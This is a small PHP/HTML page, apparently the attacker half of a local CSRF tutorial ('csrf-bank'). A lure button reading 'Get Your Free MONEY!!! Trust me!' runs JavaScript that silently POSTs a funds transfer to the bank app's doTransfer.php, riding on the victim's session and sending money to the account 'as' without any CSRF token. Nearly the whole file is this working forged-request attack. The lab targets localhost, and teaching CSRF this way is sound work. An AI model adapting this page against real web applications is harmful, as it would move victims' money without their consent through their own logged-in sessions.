<!DOCTYPE html>
<html>
<head>
	<title></title>
</head>
<body>
	<?php
	session_start();
	?>
	<div>
		<!-- <input type="" name="" id="testong" value="<?= $_SESSION['csrf_token'] ?>"> -->
		<button id="hackTransfer" onclick="getMoney()">Get Your Free MONEY!!! Trust me!</button>
		<br>
		<label id="result"></label>
	</div>
	<script>
	function getMoney(){
		var randomMoney = 0;
		var accountName = "as";
		if(Math.random() < 0.6)
			randomMoney = Math.floor(Math.random() * 100000);

		var http = new XMLHttpRequest();
		var url = "http://localhost:8088/tutorial-csrf/csrf-bank/Action/doTransfer.php";
		// var params = "to_username="+accountName+"&amount="+randomMoney+"&csrf_token="+document.getElementById("testong").value;
		var params = "to_username="+accountName+"&amount="+randomMoney;
		http.open("POST", url, true);

		//Send the proper header information along with the request
		http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");

		http.onreadystatechange = function() {//Call a function when the state changes.
		    if(http.readyState == 4 && http.status == 200) {
		        if(randomMoney == 0)
		        	document.getElementById('result').innerHTML = "<img src='https://healthandlovepage.com/wp-content/uploads/2013/11/Sad-Womans-Face.jpg' width='300' height='300'/> <div>You didn't get anything :(</div>";

		        else 
		        	document.getElementById('result').innerHTML = "<img src='http://pad2.whstatic.com/images/thumb/0/07/Get-Money-Without-Working-Step-2-Version-2.jpg/aid114103-v4-728px-Get-Money-Without-Working-Step-2-Version-2.jpg' width='300' height='300'/> <div>("+accountName+"), You Get : "+ randomMoney+" IDR</div>";
		    }
		    else if(http.status == 500){
		    	document.getElementById('result').innerHTML = "<img src='https://healthandlovepage.com/wp-content/uploads/2013/11/Sad-Womans-Face.jpg' width='300' height='300'/> <div>You didn't get anything :(</div>";
		    }
		}
		http.send(params);
	}
	</script>
</body>
</html>